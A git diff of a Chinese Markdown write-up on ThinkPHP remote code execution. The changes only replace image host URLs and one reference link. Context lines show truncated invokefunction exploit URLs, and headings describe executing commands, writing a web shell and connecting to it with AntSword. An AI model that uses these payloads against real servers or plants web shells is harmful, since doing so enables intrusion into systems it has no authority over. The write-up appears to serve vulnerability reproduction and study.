@@ -21,7 +21,7 @@ http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_u
 
 
 
-![](http://cdn.laohuan.art/2020-06-13_17-32-26.png)
+![](http://qn.laohuan.xin/2020-06-13_17-32-26.png)
 
 ##### 远程命令执行
 
@@ -31,7 +31,7 @@ http://ip:端口/index.php?s=index/think\app/invokefunction&function=call*_user_
 
 
 
-![](http://cdn.laohuan.art/2020-06-13_17-35-46.png)
+![](http://qn.laohuan.xin/2020-06-13_17-35-46.png)
 
 ##### 写shell
 
@@ -49,14 +49,14 @@ http://IP:端口/index.php?s=/index/\think\app/invokefunction&function=call*_use
 
 
 
-![](http://cdn.laohuan.art/2020-06-13_20-50-06.png)
+![](http://qn.laohuan.xin/2020-06-13_20-50-06.png)
 
 3.蚁剑连接
 
 `http://IP:端口/shell.php`
 
-![](http://cdn.laohuan.art/2020-06-13_20-54-13.png)
+![](http://qn.laohuan.xin/2020-06-13_20-54-13.png)
 
 #### 参考链接
 
-<https://www.cnblogs.com/bmjoker/p/10110868.html/>
+<http://www.cnblogs.com/bmjoker/p/10110868.html/>
